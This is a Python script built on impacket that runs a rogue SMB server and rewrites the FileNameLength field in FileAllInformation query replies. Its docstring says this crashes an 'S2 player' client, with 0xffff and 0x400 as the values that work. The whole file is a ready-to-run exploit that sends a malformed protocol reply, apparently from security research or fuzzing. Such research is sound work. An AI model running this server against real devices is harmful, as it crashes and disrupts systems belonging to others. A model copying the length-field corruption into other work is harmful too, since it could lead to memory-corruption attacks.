#!/usr/bin/env python3
"""Patch the QUERY_INFO *reply body* (not the header) and serve it to /getaa.

usage: smbserv_body.py PORT OFFSET VALUE
  OFFSET is a byte offset into the FileAllInformation reply buffer,
  VALUE is written little-endian u32 there.

FileAllInformation layout: BasicInformation 40, StandardInformation 24,
InternalInformation 8, EaInformation 4, AccessInformation 4,
PositionInformation 8, ModeInformation 4, AlignmentInformation 4,
then NameInformation { FileNameLength u32, FileName[] } at offset 96.

`PORT 96 0xffff` takes an S2 player down 2/2 (docs/RE_SMB_STATE.md); 0x100
survives, 0x400 crashes. Needs impacket and a share directory with a real image.

Requires: pip install impacket
"""
import os
import struct
import sys

from impacket.smbserver import SimpleSMBServer, SMB2Commands

PORT = int(sys.argv[1])
OFF = int(sys.argv[2], 0)
VAL = int(sys.argv[3], 0)
SHARE = os.environ.get("SMB_SHARE", os.path.expanduser("~/smbshare"))
ORIG = SMB2Commands.smb2QueryInfo


def patched(connId, smbServer, recvPacket):
    res = ORIG(connId, smbServer, recvPacket)
    try:
        r0 = res[0] if res[0] is not None else res[1]
        cmd = r0[0] if isinstance(r0, (list, tuple)) else r0
        if "Buffer" not in getattr(cmd, "fields", {}) and "Data" in getattr(cmd, "fields", {}):
            cmd = cmd["Data"]
        buf = cmd["Buffer"]
        buf = bytes(buf.getData() if hasattr(buf, "getData") else buf)
        if len(buf) >= OFF + 4:
            buf = buf[:OFF] + struct.pack("<I", VAL) + buf[OFF + 4:]
            cmd["Buffer"] = buf
            print(f"PATCHED off={OFF} val={VAL:#x} buflen={len(buf)}", flush=True)
        else:
            print(f"SHORT buflen={len(buf)} < {OFF + 4}", flush=True)
    except Exception as e:
        print("patch-error", type(e).__name__, e, flush=True)
    return res


SMB2Commands.smb2QueryInfo = staticmethod(patched)

_TC = SMB2Commands.smb2TreeConnect


def _tc(connId, smbServer, recvPacket):
    try:
        f = getattr(recvPacket, "fields", {})
        d = f.get("Data")
        print("TREE", d.get("PathBuffer") if hasattr(d, "get") else d, flush=True)
    except Exception as e:
        print("TREE-err", e, flush=True)
    return _TC(connId, smbServer, recvPacket)


SMB2Commands.smb2TreeConnect = staticmethod(_tc)

srv = SimpleSMBServer(listenAddress="0.0.0.0", listenPort=PORT)
srv.setSMB2Support(True)
srv.addShare("SHARE", SHARE)
srv.setSMBChallenge("")
srv.start()
